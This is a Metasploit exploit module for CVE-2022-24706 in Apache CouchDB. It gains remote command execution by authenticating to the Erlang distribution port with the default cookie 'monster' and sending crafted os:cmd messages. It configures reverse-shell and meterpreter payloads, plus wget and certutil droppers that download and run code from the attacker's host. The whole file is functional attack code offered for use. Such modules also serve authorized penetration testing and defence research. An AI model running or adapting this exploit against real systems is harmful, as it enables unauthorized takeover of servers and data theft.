##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  require 'digest'

  EPM_NAME_CMD = "\x00\x01\x6e".freeze
  NAME_MSG = "\x00\x15n\x00\x07\x00\x03\x49\x9cAAAAAA@AAAAAAA".freeze
  CHALLENGE_REPLY = "\x00\x15r\x01\x02\x03\x04".freeze
  CTRL_DATA = "\x83h\x04a\x06gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00w\x00w\x03rex".freeze
  COOKIE = 'monster'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache Couchdb Erlang RCE',
        'Description' => %q{
          In Apache CouchDB prior to 3.2.2, an attacker can access an improperly secured default installation without
          authenticating and gain admin privileges.
        },
        'Author'	=> [
          '1F98D',            # Erlang Cookie RCE discovery
          'Konstantin Burov', # Apache CouchDB Erlang Cookie exploit
          '_sadshade',        # Apache CouchDB Erlang Cookie exploit
          'jheysel-r7',       # Msf Module
        ],
        'References' => [
          [ 'EDB', '49418' ],
          [ 'URL', 'https://github.com/sadshade/CVE-2022-24706-CouchDB-Exploit'],
          [ 'CVE', '2022-24706'],
        ],
        'License' => MSF_LICENSE,
        'Platform' => ['win', 'linux'],
        'Privileged' => false,
        'Arch' => [ ARCH_CMD ],
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_openssl'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => :wget,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x86/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'Windows Command',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD,
              'Type' => :win_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'
              }
            }
          ],
          [
            'Windows Dropper',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :win_dropper,
              'CmdStagerFlavor' => :certutil,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter_reverse_tcp'
              }
            }
          ],
          [
            'PowerShell Stager',
            {
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :psh_stager,
              'CmdStagerFlavor' => :certutil,
              'DefaultOptions' => {
                'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DisclosureDate' => '2022-01-21',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      ),
    )

    register_options(
      [
        Opt::RPORT(4369)
      ]
    )
  end

  def check
    # TODO
  end

  def get_erlang_ports
    # CONNECT TO EDPM:
    erlang_ports = []
    begin
      print_status('Connecting to the EDPM socket...')
      connect(true, { 'RHOST' => datastore['RHOSTS'], 'RPORT' => datastore['RPORT'] })
      # request Erlang nodes
      sock.put(EPM_NAME_CMD)
      sleep datastore['WfsDelay']
      res = sock.get_once
      fail_with(Failure::UnexpectedReply, 'Did not find any Erlang nodes') unless res && res.include?("\x00\x00\x11\x11name")
      print_status("res: #{res}")
      print_status('Success')
      res.each_line do |line|
        erlang_ports << line.match(/\s(\d+$)/)[0]
      end
    rescue ::Rex::ConnectionError, ::EOFError, ::Errno::ECONNRESET => e
      disconnect
      print_error("Error: #{e.class} #{e} #{e.backtrace}")
    end
    erlang_ports
  end

  def connect_to_erlang_server(erlang_port)
    # CONNECT TO ERLANG PORT:

    print_status('Connecting to Erlang Server...')
    # TODO: Iterate over erlang_ports
    connect(true, { 'RHOST' => datastore['RHOSTS'], 'RPORT' => erlang_port })
    print_status('Connected')
    sock.put(NAME_MSG)
    sleep datastore['WfsDelay']
    sock.get_once(5) # ok message
    challenge = sock.get_once
    challenge = challenge[9..12].unpack('N*')[0]
    challenge_reply = "\x00\x15r\x01\x02\x03\x04"
    md5 = Digest::MD5.new
    md5.update(COOKIE + challenge.to_s)
    challenge_reply << [md5.hexdigest].pack('H*')
    sock.put(challenge_reply)
    sleep datastore['WfsDelay']
    challenge_response = sock.get_once

    if challenge_response.nil?
      fail_with(Failure::UnexpectedReply, 'Authentication was unsuccessful')
    end
    print_status('Erlang challenge and response completed successfully')

    return sock
  rescue ::Rex::ConnectionError, ::EOFError, ::Errno::ECONNRESET => e
    disconnect
    print_error("Couldn't connect to Erlang server. Error: #{e.class} #{e} #{e.backtrace} ")
  end

  def compile_cmd(cmd)
    msg = "\x83h\x02gw\x0eAAAAAA@AAAAAAA\x00\x00\x00\x03\x00\x00\x00\x00\x00h\x05w\x04callw\x02osw\x03cmdl\x00\x00\x00\x01k"
    msg << [cmd.length].pack('S>')
    msg << cmd
    msg << "jw\x04user"
    payload = ("\x70" + CTRL_DATA + msg)
    ([payload.size].pack('N*') + payload)
  end

  def execute_command(cmd, opts = {})
    payload = compile_cmd(cmd)
    print_status('sending payload... ')
    opts[:sock].put(payload)
    sleep datastore['WfsDelay']
  end

  def exploit
    erlang_ports = get_erlang_ports
    # TODO: test with multiple ports configured
    erlang_ports.each do |erlang_port|
      sock = connect_to_erlang_server(erlang_port.to_i)
      case target['Type']
      when :unix_cmd, :win_cmd
        execute_command(payload.encoded, { sock: sock })
      when :linux_dropper, :win_dropper, :psh_stager
        execute_cmdstager({ sock: sock })
      else
        fail_with(Failure::BadConfig, 'Invalid target specified')
      end
    end
  end
end
